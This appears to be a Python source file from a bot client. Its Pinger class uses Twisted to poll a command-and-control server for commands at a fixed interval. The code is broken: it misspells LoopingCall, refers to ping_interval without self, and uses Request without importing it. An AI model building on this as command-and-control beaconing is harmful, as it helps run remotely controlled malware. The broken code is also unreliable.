# library imports
from twisted.internet import reactor, task

# internal imports
from utils.request_type import RequestType

class Pinger:
    """ A class to periodically ping the C&C server for commands. """

    def __init__(self, ping_interval):
        self.ping_interval = ping_interval

    def start(self):
        """ Sends a ping request to the server in an interval. """

        ping_task = task.LoppingCall(self.ping)
        ping_task.start(ping_interval)

        reactor.run()

    def ping(self):
        request = Request(RequestType.PING)
        request.send()